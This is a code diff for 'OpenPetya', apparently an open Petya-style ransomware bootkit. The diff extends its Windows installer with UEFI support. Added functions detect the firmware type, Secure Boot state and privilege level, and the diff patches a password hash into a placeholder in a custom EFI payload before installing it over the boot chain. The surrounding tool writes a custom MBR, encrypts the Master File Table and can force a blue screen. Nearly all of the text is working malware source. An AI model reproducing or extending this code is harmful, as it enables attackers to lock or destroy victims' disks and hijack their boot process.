@@ -12,6 +12,7 @@ Components:
     1. OpenPetya.exe — User-Interface of OpenPetya
     2. mbr.bin — Custom Master Boot Record, written in assembly language
     3. stage2.bin — Stage2 program which contains core functionalities, including Salsa20 cryptographic algorithm, written in C
+    4. petya.efi — Custom program for UEFI
 
 What it CAN do:
     1. Encrypt 256 sectors of Master File Table (MFT)
@@ -25,6 +26,7 @@ What is CAN'T do:
 
 #include <windows.h>
 #include <winternl.h>
+#include <sddl.h>
 #include <iostream>
 #include <setupapi.h>
 #include <devguid.h>
@@ -34,12 +36,15 @@ What is CAN'T do:
 #include <iomanip>
 #include <cstring>
 #include <tchar.h>
+#include <wincrypt.h>
 
 #include "config.h"
 #include "utils.h"
 #include "uefi.h"
+#include "logs.h"
 
 #pragma comment(lib, "setupapi.lib")
+#pragma comment(lib, "advapi32.lib")
 
 // Define prototype of NtRaiseHardError
 typedef NTSTATUS (NTAPI* NtRaiseHardError_t)(
@@ -59,6 +64,8 @@ typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(
     PBOOLEAN
 );
 
+typedef BOOL(WINAPI* PFN_GetFirmwareType)(PFIRMWARE_TYPE FirmwareType);
+
 struct stDriveInfo
 {
     int nIndex;
@@ -66,6 +73,214 @@ struct stDriveInfo
     std::wstring szModel;
     std::wstring szPath;
 };
+
+bool fnComputePasswordHash(
+    const std::string& password,
+    std::vector<BYTE>& outHash)
+{
+    const uint32_t FNV_OFFSET_BASIS = 2166136261UL;
+    const uint32_t FNV_PRIME = 16777619UL;
+
+    uint32_t hash = FNV_OFFSET_BASIS;
+
+    for (unsigned char c : password)
+    {
+        hash ^= c;
+        hash *= FNV_PRIME;
+    }
+
+    outHash.resize(4);
+
+    memcpy(
+        outHash.data(),
+        &hash,
+        sizeof(hash)
+    );
+
+    return true;
+}
+
+BOOL fnPatchBinary(std::vector<BYTE>& abFileData, const std::vector<BYTE>& abPattern, const std::vector<BYTE>& abReplace)
+{
+    if (abPattern.size() != abReplace.size())
+    {
+        fnPrintLog(LEVEL_ERROR, "Pattern and replacement size must match!\n");
+        return FALSE;
+    }
+
+    for (size_t i = 0; i <= abFileData.size() - abPattern.size(); ++i)
+    {
+        if (memcmp(&abFileData[i], abPattern.data(), abPattern.size()) == 0)
+        {
+            memcpy(&abFileData[i], abReplace.data(), abReplace.size());
+            fnPrintLog(LEVEL_GOOD, "Successfully patched at offset: 0x%x\n", i);
+
+            return TRUE;
+        }
+    }
+
+    fnPrintLog(LEVEL_ERROR, "Cannot find pattern in the targe");
+
+    return FALSE;
+}
+
+std::wstring fnGetCurrentPrivilegeLevel()
+{
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+        return L"Unknown";
+
+    DWORD dwSize = 0;
+    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
+    PTOKEN_USER pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize);
+
+    // TrustedInstaller (SID prefix: S-1-5-80-)
+    if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
+    {
+        LPWSTR sidString = NULL;
+        if (ConvertSidToStringSidW(pTokenUser->User.Sid, &sidString))
+        {
+            if (wcsncmp(sidString, L"S-1-5-80-", 9) == 0)
+            {
+                LocalFree(sidString);
+                LocalFree(pTokenUser);
+                CloseHandle(hToken);
+
+                return L"TrustedInstaller";
+            }
+
+            // NT AUTHORITY\SYSTEM (S-1-5-18)
+            if (wcscmp(sidString, L"S-1-5-18") == 0)
+            {
+                LocalFree(sidString);
+                LocalFree(pTokenUser);
+                CloseHandle(hToken);
+
+                return L"SYSTEM";
+            }
+
+            LocalFree(sidString);
+        }
+    }
+
+    if (pTokenUser)
+        LocalFree(pTokenUser);
+
+    PSID pAdministratorsGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    BOOL fIsRunAsAdmin = FALSE;
+
+    if (AllocateAndInitializeSid(
+        &NtAuthority,
+        2,
+        SECURITY_BUILTIN_DOMAIN_RID, 
+        DOMAIN_ALIAS_RID_ADMINS,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        &pAdministratorsGroup
+    ))
+    {
+        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
+        FreeSid(pAdministratorsGroup);
+    }
+
+    CloseHandle(hToken);
+
+    if (fIsRunAsAdmin)
+        return L"Administrator";
+
+    return L"Standard User";
+}
+
+BOOL fnbIsSystemUEFI()
+{
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    if (hKernel32)
+    {
+        // OS version >= Windows 8
+        PFN_GetFirmwareType pfnGetFirmwareType = (PFN_GetFirmwareType)GetProcAddress(hKernel32, "GetFirmwareType");
+        if (pfnGetFirmwareType != NULL)
+        {
+            FIRMWARE_TYPE fwType = FirmwareTypeUnknown;
+            if (pfnGetFirmwareType(&fwType))
+            {
+                if (fwType == FirmwareTypeUefi)
+                    return TRUE;
+                if (fwType == FirmwareTypeBios)
+                    return FALSE;
+            }
+        }
+
+        // Windows 7 / Vista
+        SetLastError(0);
+        GetFirmwareEnvironmentVariableW(
+            L"",
+            L"{00000000-0000-0000-0000-000000000000}", 
+            NULL, 
+            0
+        );
+
+        DWORD err = GetLastError();
+
+        if (ERROR_INVALID_HANDLE == err)
+            return FALSE; // Legacy BIOS
+        
+        // Ultimate method
+        HKEY hKey;
+        if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control", 0, KEY_READ, &hKey))
+        {
+            DWORD fwTypeReg = 0;
+            DWORD bufferSize = sizeof(DWORD);
+            if (ERROR_SUCCESS == RegQueryValueExW(hKey, L"PEFirmwareType", NULL, NULL, (LPBYTE)&fwTypeReg, &bufferSize))
+            {
+                RegCloseKey(hKey);
+                return 2 == fwTypeReg; // 2: UEFI, 1: BIOS
+            }
+
+            RegCloseKey(hKey);
+        }
+    }
+
+    return FALSE; // Default: BIOS. EIP should not approach here if the operating system uses UEFI.
+}
+
+BOOL fnbIsSecureBootEnabled()
+{
+    HKEY hKey;
+    DWORD nState = 0;
+    DWORD nBufferSize = sizeof(DWORD);
+
+    LONG result = RegOpenKeyExW(
+        HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State",
+        0,
+        KEY_READ,
+        &hKey
+    );
+
+    if (ERROR_SUCCESS != result)
+        return FALSE;
+
+    result = RegQueryValueExW(
+        hKey,
+        L"UEFISecureBootEnabled",
+        NULL,
+        NULL,
+        (LPBYTE)&nState,
+        &nBufferSize
+    );
+
+    RegCloseKey(hKey);
+
+    if (ERROR_SUCCESS == result && 1 == nState)
+        return TRUE;
+
+    return FALSE;
+}
 
 /// @brief 
 /// @return 
@@ -689,34 +904,39 @@ void fnPrintUsage(const char* szProg)
 {
     fnPrintBanner();
 
-    std::wcout  << "\nUsage: " << szProg << " [options]\n\n"
-                << "Options:\n"
-                << "Legacy BIOS:\n"
-                << "\t--install <mbr.bin> <stage.bin>   Full installation\n"
-                << "\t--backup-mbr <file>               Backup MBR to specified output file\n"
-                << "\t--save-chainload                  Save MBR to sector 63\n"
-                << "\t--write-mbr                       Write MBR boot code\n"
-                << "\t--write-stage2                    Write Stage2\n"
-                << "\t--restore-mbr                     Restore original MBR\n"
-                
-                << "\nUEFI:\n"
-                << "\t--uefi-install                    Install custom UEFI program\n"
-                << "\t--uefi-restore                    Restore original UEFI program\n"
+    std::wcout << "\nUsage: " << szProg << " [options] [command]\n\n"
+          << "Global Options:\n"
+          << "  --drive N                    Select target physical drive (default: 0)\n\n"
 
-                << "\nTools:\n"
-                << "\t--validate                        Show disk state\n"
-                << "\t--bsod                            Raise BSOD via NtRaiseHardError()\n"
-                << "\t--list                            List physical drives\n"
+          << "Legacy BIOS Commands:\n"
+          << "  --install <mbr> <stage>      Full MBR & stage2 installation\n"
+          << "  --backup-mbr <file>          Backup MBR to specified file\n"
+          << "  --restore-mbr <file>         Restore original MBR from file\n"
+          << "  --save-chainload             Save MBR to sector 63\n"
+          << "  --write-mbr                  Write MBR boot code only\n"
+          << "  --write-stage2               Write Stage2 payload only\n\n"
 
-                << "\nExploit:\n"
-                << "\t--drive N                         Select PhysicalDriveN\n"
+          << "UEFI Commands:\n"
+          << "  --uefi-install               Install custom UEFI program\n"
+          << "  --uefi-restore               Restore original UEFI program\n"
+          << "  --uefi-secure                Check if Secure Boot is enabled\n\n"
 
-                << "\nExamples:\n"
-                << "\tOpenPetya.exe --list\n"
-                << "\tOpenPetya.exe --drive 1 --backup-mbr\n"
-                << "\tOpenPetya.exe --drive 1 --install mbr.bin stage2.bin\n"
-                << "\tOpenPetya.exe --drive 1 --restore-mbr original_mbr.bin\n"
-                << "\tOpenPetya.exe --drive 1 --validate\n\n";
+          << "Diagnostics & Tools:\n"
+          << "  --validate                   Show disk and boot state (BIOS)\n"
+          << "  --list                       List available physical drives\n"
+          << "  --is-admin                   Check current privilege level\n"
+          << "  --firmware                   Get firmware type (BIOS/UEFI)\n"
+          << "  --bsod                       Trigger BSOD via NtRaiseHardError()\n\n"
+
+          << "Examples:\n"
+          << "  " << szProg << " --list\n"
+          << "  " << szProg << " --firmware\n"
+          << "  " << szProg << " --is-admin\n"
+          << "  " << szProg << " --bsod\n"
+          << "  " << szProg << " --drive 1 --validate\n"
+          << "  " << szProg << " --drive 1 --backup-mbr mbr_backup.bin\n"
+          << "  " << szProg << " --drive 1 --install stage2.mbr bootloader.bin\n"
+          << "  " << szProg << " --drive 1 --uefi-install petya.efi\n\n";
 }
 
 int _tmain(int argc, char *argv[])
@@ -769,9 +989,66 @@ int _tmain(int argc, char *argv[])
         {
             bList = true;
         }
+        else if (arg == "--is-admin")
+        {
+            fnPrintLog(LEVEL_INFO, "Checking privilege...\n");
+
+            std::wstring priv = fnGetCurrentPrivilegeLevel();
+            if (priv == L"Unknown")
+            {
+                fnPrintLog(LEVEL_ERROR, "Failed to get current privilege level.\n");
+                return 1;
+            }
+
+            if (priv == L"Standard User") {
+                fnPrintLog(LEVEL_WARN, L"Running as: %ls (Warning: Some features require Admin rights)\n", priv.c_str());
+            } else {
+                fnPrintLog(LEVEL_GOOD, L"Running with high privilege: %ls\n", priv.c_str());
+            }
+
+            return 0;
+        }
+        else if (arg == "--firmware")
+        {
+            fnPrintLog(LEVEL_INFO, L"Checking firmware...\n");
+
+            BOOL bUEFI = fnbIsSystemUEFI();
+            fnPrintLog(LEVEL_INFO, L"Firmware type: %ls\n", bUEFI ? L"UEFI" : L"BIOS");
+
+            return 0;
+        }
+        else if (arg == "--uefi-secure")
+        {
+            fnPrintLog(LEVEL_INFO, L"Checking if Secure Boot is enabled...\n");
+            
+            if (!fnbIsSystemUEFI())
+            {
+                fnPrintLog(LEVEL_WARN, L"Current system is BIOS\n");
+                return 0;
+            }
+
+            BOOL bSecure = fnbIsSecureBootEnabled();
+            fnPrintLog(LEVEL_INFO, L"Secure Boot: %ls", bSecure ? L"True" : L"False");
+
+            return 0;
+        }
         else if (arg == "--drive" && i + 1 < argc)
         {
-            nIdxDrive = std::stoi(argv[++i]);
+            try
+            {
+                nIdxDrive = std::stoi(argv[++i]);
+                if (nIdxDrive < 0)
+                {
+                    std::cerr << "Error: --drive value must be greater than or equal to 0.\n";
+                    return 1;
+                }
+            }
+            catch(const std::exception& e)
+            {
+                std::cerr << "Error: --drive requires a valid numeric argument, but got '" << argv[i] << "'.\n";
+                return 1;
+            }
+            
         }
         else if (arg == "--backup-mbr" && i + 1 < argc)
         {
@@ -1006,11 +1283,14 @@ int _tmain(int argc, char *argv[])
         UINT64 nTotalSectors = fnGetDiskTotalSectors(szDrivePath);
         if (!nTotalSectors)
         {
-            fprintf(stderr, "[-] Cannot get disk size!\n");
+            fnPrintLog(LEVEL_ERROR, "Cannot get disk size!\n");
             return 1;
         }
 
-        std::string szPassword1, szPassword2;
+        // Get password
+        std::string szPassword1;
+        std::string szPassword2;
+
         while (true)
         {
             szPassword1 = fnInputPassword("Set password: ");
@@ -1019,18 +1299,211 @@ int _tmain(int argc, char *argv[])
             if (!szPassword1.empty() && szPassword1 == szPassword2)
                 break;
 
-            fprintf(stderr, "[!] " + szPassword1.empty() ? "Empty!\n" : "Mismatch!\n");
+            if (szPassword1.empty())
+                fnPrintLog(LEVEL_ERROR, "Empty!\n");
+            else
+                fnPrintLog(LEVEL_ERROR, "Mismatch!\n");
         }
 
-        bool bResult = fnbInstallUEFI(szMyEfiPath, szPassword1, szDrivePath, nTotalSectors);
+
+        std::vector<BYTE> abPasswordHash;
+
+        if (!fnComputePasswordHash(szPassword1, abPasswordHash))
+        {
+            fnPrintLog(LEVEL_ERROR, "Failed to compute password hash!\n");
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+        wchar_t szTempDir[MAX_PATH];
+
+        if (GetTempPathW(MAX_PATH, szTempDir) == 0)
+        {
+            fnPrintLog(LEVEL_ERROR, "Failed to get temp directory!\n");
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+
+        wchar_t szTempEfiPath[MAX_PATH];
+
+        if (GetTempFileNameW(szTempDir, L"PTY", 0, szTempEfiPath) == 0)
+        {
+            fnPrintLog(LEVEL_ERROR, "Failed to create temporary filename!\n");
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+        if (!CopyFileW(szMyEfiPath.c_str(), szTempEfiPath, FALSE))
+        {
+            fnPrintLog(LEVEL_ERROR, "[-] Failed to create temporary EFI file!\n");
+
+            DeleteFileW(szTempEfiPath);
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+        std::ifstream file(
+            szTempEfiPath,
+            std::ios::binary | std::ios::ate);
+
+        if (!file.is_open())
+        {
+            fprintf(stderr, "[-] Failed to open temporary EFI file!\n");
+
+            DeleteFileW(szTempEfiPath);
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+        std::streamsize size = file.tellg();
+
+        if (size <= 0)
+        {
+            file.close();
+
+            fnPrintLog(LEVEL_ERROR, "Temporary EFI file is empty!\n");
+
+            DeleteFileW(szTempEfiPath);
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+        file.seekg(0, std::ios::beg);
+
+        std::vector<BYTE> abFileBuffer(static_cast<size_t>(size));
+
+        if (!file.read(reinterpret_cast<char *>(abFileBuffer.data()), size))
+        {
+            file.close();
+
+            fnPrintLog(LEVEL_ERROR, "Failed to read temporary EFI file!\n");
+
+            DeleteFileW(szTempEfiPath);
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+        file.close();
+
+        std::vector<BYTE> abPattern = {
+            0xDE, 0xAD, 0xBE, 0xEF
+        };
+
+        if (!fnPatchBinary(abFileBuffer, abPattern, abPasswordHash))
+        {
+            fnPrintLog(LEVEL_ERROR, "Failed to patch EFI binary!\n");
+
+            DeleteFileW(szTempEfiPath);
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+        std::ofstream outFile(szTempEfiPath, std::ios::binary | std::ios::trunc);
+
+        if (!outFile.is_open())
+        {
+            fnPrintLog(LEVEL_ERROR, "Failed to open patched EFI file!\n");
+
+            DeleteFileW(szTempEfiPath);
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+
+        outFile.write(reinterpret_cast<const char *>(abFileBuffer.data()), static_cast<std::streamsize>(abFileBuffer.size()));
+
+        if (!outFile.good())
+        {
+            outFile.close();
+
+            fnPrintLog(LEVEL_ERROR, "Failed to write patched EFI file!\n");
+
+            DeleteFileW(szTempEfiPath);
+
+            for (char &c : szPassword1)
+                c = 0;
+
+            for (char &c : szPassword2)
+                c = 0;
+
+            return 1;
+        }
+
+        outFile.close();
+
+
+        fnPrintLog(LEVEL_INFO, "Installing patched UEFI...\n");
+
+        bool bResult = fnbInstallUEFI(szTempEfiPath, szPassword1, szDrivePath, nTotalSectors);
+
+        fnPrintLog(LEVEL_INFO, "Delete temporary EFI...\n");
+
+        DeleteFileW(szTempEfiPath);
 
         for (char &c : szPassword1)
             c = 0;
+
         for (char &c : szPassword2)
             c = 0;
 
         return bResult ? 0 : 1;
     }
+
 
     if (bUefiRestore)
         return fnbRestoreUEFI() ? 0 : 1;
